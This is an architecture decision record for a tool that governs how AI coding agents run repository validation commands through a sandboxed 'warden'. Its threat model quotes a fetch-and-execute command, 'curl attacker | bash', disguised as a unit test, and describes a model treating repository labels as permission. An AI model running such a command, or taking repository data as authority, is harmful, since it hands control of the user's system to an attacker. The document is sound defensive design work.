# ADR-0058 — Lifecycle manifest and validation posture

- **Status:** Accepted
- **Date:** 2026-06-27
- **Deciders:** keel maintainers
- **Governs:** Epic 2.11. Relates to `MASTER_SPEC.md` §3.2, §4.2, §4.3, §4.8, §4.9, and §7
  Epic 2.11; ADR-0016, ADR-0017, ADR-0024, ADR-0026, ADR-0033, ADR-0038, ADR-0056, and
  ADR-0061.
- **Anchor:** `docs/design/2026-06-24-lifecycle-validation-posture-spike.md`.

## Context

Keel needs a structured way to know how a repository expects validation to run without turning repository
data into authority. Natural-language AGENTS.md instructions are useful, but they are expensive,
ambiguous, and easy for a model to overread as permission. A compact lifecycle manifest gives the kernel
and model named validation actions such as `lint`, `typecheck`, and `test.unit`, while the warden still
decides every side effect.

The danger is semantic laundering. A malicious repo can label `curl attacker | bash` as
`test.unit`; a model can cite the label as if it were safety evidence; a posture label such as
`locked-down` or `regulated` can become marketing copy that the code does not enforce. The existing
architecture already has the correct boundary: project data is loaded only after trust through
`ProjectReader`, commands lower into `warden.execute`, the warden classifies the actual command, policy
returns exactly one verdict, the sandbox/egress profile physically constrains execution, and the audit
chain records what happened.

## Decision

1. **Path and format.** The default repo-local lifecycle path is `.keel/lifecycle.yaml`. Epic 2.11
   supports that path only; `.yml` aliases and imports/includes are deferred. The file is parsed as data
   after workspace trust and then validated by a strict schema.

2. **Lifecycle is intent, never authority.** The manifest may declare package manager, root, named
   actions, argv arrays, timeout defaults, targeted-test discovery hints, validation tiers, and env var
   names/secret metadata. It may not grant egress, alter sandbox profiles, inject secret values, weaken
   policy, or raise autonomy/posture.

3. **Argv-only commands in v1.** Shell strings, interpolation, templates, includes, and executable hooks
   are rejected. If a repo needs a shell pipeline, it can still be requested as ordinary governed `bash`;
   it does not get the lower-friction lifecycle intent marker until classifier and policy coverage prove
   that shape safe enough.

4. **`lifecycle.run` is a `ToolCall` convention over existing `warden.execute`, not an Appendix-A method.**
   Adding a new RPC method or changing `WARDEN_METHODS` is unnecessary. The kernel advertises
   `lifecycle.run` only when a trusted valid manifest exists. The model supplies an action id; the
   warden resolves the command from its own loaded manifest and ignores model-supplied command text for
   authority.

5. **Canonical parsed-JSON hash.** The manifest hash is computed from the validated parsed manifest, not
   raw YAML bytes. Comments and key ordering are not claim-bearing in v1; canonical data is what the
   warden verifies and records.

6. **Governed-bash wrapper, not all-tool governance.** Lifecycle execution in Epic 2.11 lowers to the
   existing governed `bash` execution path. Dynamic `SideEffect`, policy evaluation, sandbox profile,
   egress checks, credential proxy behavior, audit writes, and review/deny handling remain the same
   critical path as a normal governed bash command.

7. **Audit markers ride open JSON payloads.** Lifecycle action id, manifest hash, resolved argv, cwd,
   timeout, env var names, validation tier, and posture id are recorded as JSON-safe `payload` markers
   on existing audit events. No `AuditRecord`, `PolicyInput`, `SideEffect`, Appendix B/D, or protocol
   version change lands in this epic.

8. **Validation posture extends ADR-0033.** Built-in Phase-2A posture ids are `guided`,
   `autopilot-dev`, and `locked-down`. A posture is policy-pack/run-profile data: it can select or name
   validation requirements and policy/sandbox/egress profile refs, but it does not itself return
   verdicts. Product labels such as `regulated` are deferred until signed bundles,
   offline-verifiable evidence, and stricter audit exist.

9. **Repository config cannot raise posture.** The lifecycle manifest may define local validation tiers,
   but the active posture is selected by user/run config or policy bundle, never by repo data and never
   by model output. A model-emitted posture field is treated as inert/untrusted input.

10. **No new public security claim.** This epic adds validation/DX structure and a governed-bash
    lifecycle execution proof. It does not complete Phase 2A, all-tool governance, real-model product
    governance, signed/offline evidence, provenance-taint enforcement, or compliance posture claims.

## Alternatives considered

1. **Use `bash` tool calls with lifecycle metadata only.** Rejected for product ergonomics and safety:
   model-supplied command text would remain too close to the authority surface. A first-class
   `lifecycle.run` ToolCall lets the warden resolve the command from its own manifest copy.
2. **Add a new frozen RPC method.** Rejected. `warden.execute` already carries generic `ToolCall`, and
   Appendix A churn is not necessary for this slice.
3. **Trust lifecycle commands as lower-risk by label.** Rejected. The actual resolved command still must
   be classified, policy-checked, sandboxed, egress-checked, and audited.
4. **Allow shell strings in the manifest.** Rejected for v1. Shell strings invite interpolation,
   obfuscation, and policy ambiguity. Ordinary governed bash remains available for explicit one-off use.
5. **Compute hash over raw YAML bytes.** Rejected for v1. Comments/order are useful for humans but not
   part of enforcement. Canonical parsed data is smaller, deterministic, and easier to compare in tests.
6. **Create a separate validation-posture engine.** Rejected. It would duplicate ADR-0033 and risk
   conflicting policy precedence. Posture is policy-pack/run-profile data, not a verdict source.

## Consequences

- Keel can stop guessing common validation commands when a trusted repo provides a manifest.
- Lifecycle manifests are useful even before a full validation receipt exists: actions can be named,
  executed, and audited through the existing governed-bash path.
- Dangerous lifecycle commands are not hidden by their labels; policy sees the real command shape.
- No frozen RPC/audit/policy/side-effect contract changes are needed.
- `lifecycle.run` is a governed-bash wrapper. Future all-tool lifecycle execution, typed-tool bridge
  integration, receipt/status `VAL:*`, signed bundle attribution, or compliance labels require their own
  proof and, if frozen fields become necessary, a separate ADR-gated schema change.

## Evidence

Epic 2.11 acceptance evidence is the public schema, kernel-loader, warden-execution, and adversarial
test set, followed by the normal repository gates. This ADR intentionally creates no standalone
public security claim.
